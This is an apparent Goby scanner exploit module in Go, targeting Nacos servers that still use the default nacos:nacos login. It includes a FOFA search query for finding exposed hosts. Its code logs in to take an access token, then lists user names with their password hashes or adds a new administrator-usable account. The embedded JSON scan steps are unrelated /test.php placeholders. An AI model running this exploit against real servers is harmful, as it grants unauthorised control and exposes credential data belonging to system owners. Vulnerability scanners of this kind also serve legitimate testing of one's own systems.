package exploits

import (
	"encoding/json"
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Nacos default password vulnerability",
    "Description": "<p>Nacos is a platform for building dynamic service discovery, configuration management, and service management for cloud-native applications.</p><p>There is a default password vulnerability in Nacos. Attackers can use nacos:nacos to control Nacos and use administrator privileges to operate core functions.</p>",
    "Product": "NACOS",
    "Homepage": "https://nacos.io/zh-cn/index.html",
    "DisclosureDate": "2023-08-08",
    "PostTime": "2023-08-12",
    "Author": "1794790963@qq.com",
    "FofaQuery": " title=\"Nacos\" || (body=\"Alibaba Group Holding Ltd.\" && body=\"src=\\\"js/main.js\" && body=\"console-fe\") || (banner=\"/nacos/\" && (banner=\"HTTP/1.1 302\" || banner=\"HTTP/1.1 301 Moved Permanently\")) || banner=\"realm=\\\"nacos\"",
    "GobyQuery": " title=\"Nacos\" || (body=\"Alibaba Group Holding Ltd.\" && body=\"src=\\\"js/main.js\" && body=\"console-fe\") || (banner=\"/nacos/\" && (banner=\"HTTP/1.1 302\" || banner=\"HTTP/1.1 301 Moved Permanently\")) || banner=\"realm=\\\"nacos\"",
    "Level": "3",
    "Impact": "<p>There is a default password vulnerability in Nacos. Attackers can use nacos:nacos to control Nacos and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "listUser,addUser",
            "show": ""
        },
        {
            "name": "addUser",
            "type": "select",
            "value": "auto,custom",
            "show": "attackType=addUser"
        },
        {
            "name": "username",
            "type": "input",
            "value": "1552eedfe1caab87",
            "show": "addUser=custom"
        },
        {
            "name": "password",
            "type": "input",
            "value": "1552eedfe1caab87",
            "show": "addUser=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "Nacos 默认口令漏洞",
            "Product": "NACOS",
            "Description": "<p>Nacos 是构建云原生应用的动态服务发现、配置管理和服务管理的平台。<br></p><p>Nacos 存在默认口令漏洞，攻击者可利用 nacos:nacos 控制 Nacos，使用管理员权限操作核心的功能。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>Nacos 存在默认口令漏洞，攻击者可利用 nacos:nacos 控制 Nacos，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Nacos default password vulnerability",
            "Product": "NACOS",
            "Description": "<p>Nacos is a platform for building dynamic service discovery, configuration management, and service management for cloud-native applications.</p><p>There is a default password vulnerability in Nacos. Attackers can use nacos:nacos to control Nacos and use administrator privileges to operate core functions.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>There is a default password vulnerability in Nacos. Attackers can use nacos:nacos to control Nacos and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10831"
}`

	loginUserFlag6EKK := func(hostInfo *httpclient.FixUrl, username, password string) (string, error) {
		for _, uri := range []string{"/v1/auth/login", `/nacos/v1/auth/login`} {
			loginRequest := httpclient.NewPostRequestConfig(uri)
			loginRequest.VerifyTls = false
			loginRequest.FollowRedirect = false
			loginRequest.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			loginRequest.Header.Store("Accept-Encoding", "gzip, deflate")
			loginRequest.Data = `username=` + username + `&password=` + password + `&namespaceId=`
			rsp, err := httpclient.DoHttpRequest(hostInfo, loginRequest)
			if err != nil {
				return "", err
			}
			if rsp.StatusCode == 404 {
				continue
			}
			if strings.HasPrefix(rsp.Utf8Html, "{") && strings.HasSuffix(rsp.Utf8Html, "}") &&
				strings.Contains(rsp.Utf8Html, "accessToken") {
				var data map[string]interface{}
				err := json.Unmarshal([]byte(rsp.Utf8Html), &data)
				if err != nil {
					return "", err
				} else {
					accessToken, ok := data["accessToken"].(string)
					if !ok {
						return "", err
					}
					return accessToken, err
				}
			}
			break
		}
		return "", errors.New("漏洞不存在")
	}

	addUserFlag6EKK := func(hostInfo *httpclient.FixUrl, accessToken, username, password string) (*httpclient.HttpResponse, error) {
		uris := []string{`/nacos/v1/auth/users?username={{username}}&password={{password}}`, `/v1/auth/users?username={{username}}&password={{password}}`}
		for _, uri := range uris {
			uri = strings.ReplaceAll(uri, `{{username}}`, username)
			uri = strings.ReplaceAll(uri, `{{password}}`, password)
			addUserRequest := httpclient.NewPostRequestConfig(uri)
			addUserRequest.VerifyTls = false
			addUserRequest.FollowRedirect = false
			addUserRequest.Header.Store("Accesstoken", accessToken)
			rsp, err := httpclient.DoHttpRequest(hostInfo, addUserRequest)
			if err != nil {
				return nil, err
			}
			if rsp.StatusCode == 404 {
				continue
			}
			return rsp, err
		}
		return nil, errors.New("漏洞利用失败")
	}

	listUserFlag6EKK := func(hostInfo *httpclient.FixUrl, accessToken string) ([]string, error) {
		uris := []string{`/nacos/v1/auth/users?pageNo=1&pageSize=9`, `/v1/auth/users?pageNo=1&pageSize=9`}
		for _, uri := range uris {
			getRequestConfig := httpclient.NewGetRequestConfig(uri)
			getRequestConfig.VerifyTls = false
			getRequestConfig.FollowRedirect = false
			getRequestConfig.Header.Store("Accesstoken", accessToken)
			rsp, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
			if err != nil {
				return nil, err
			}
			if rsp.StatusCode == 404 {
				continue
			}
			// json 反序列化
			var data map[string]interface{}
			err = json.Unmarshal([]byte(rsp.Utf8Html), &data)
			var userList []string
			if err != nil {
				continue
			}
			pageItems, ok := data["pageItems"].([]interface{})
			if !ok {
				continue
			}
			for _, item := range pageItems {
				itemData, ok := item.(map[string]interface{})
				if !ok {
					continue
				}
				username, ok := itemData["username"].(string)
				if !ok {
					continue
				}
				password, ok := itemData["password"].(string)
				if !ok {
					continue
				}
				userList = append(userList, username+"\t"+password)
			}
			return userList, nil
		}
		return nil, errors.New("漏洞利用失败")
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			accessToken, err := loginUserFlag6EKK(hostInfo, "nacos", "nacos")
			if err != nil || accessToken == "" {
				return false
			}
			stepLogs.VulURL = hostInfo.Scheme() + "://nacos:nacos@" + hostInfo.HostInfo
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			username := goutils.B2S(ss.Params["username"])
			password := goutils.B2S(ss.Params["password"])
			adduser := goutils.B2S(ss.Params["addUser"])
			accessToken, err := loginUserFlag6EKK(expResult.HostInfo, "nacos", "nacos")
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if attackType == "listUser" {
				userList, err := listUserFlag6EKK(expResult.HostInfo, accessToken)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				expResult.Output = strings.Join(userList, "\n")
				expResult.Success = true
			} else if attackType == "addUser" {
				if adduser == "auto" {
					username = goutils.RandomHexString(16)
					password = goutils.RandomHexString(16)
				}
				rsp, err := addUserFlag6EKK(expResult.HostInfo, accessToken, username, password)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				if strings.Contains(rsp.Utf8Html, `create user ok!`) {
					expResult.Success = true
					expResult.Output = `username: ` + username + "\npassword: " + password
				} else {
					expResult.Success = false
					expResult.Output = rsp.Utf8Html
				}
			}
			return expResult
		},
	))
}
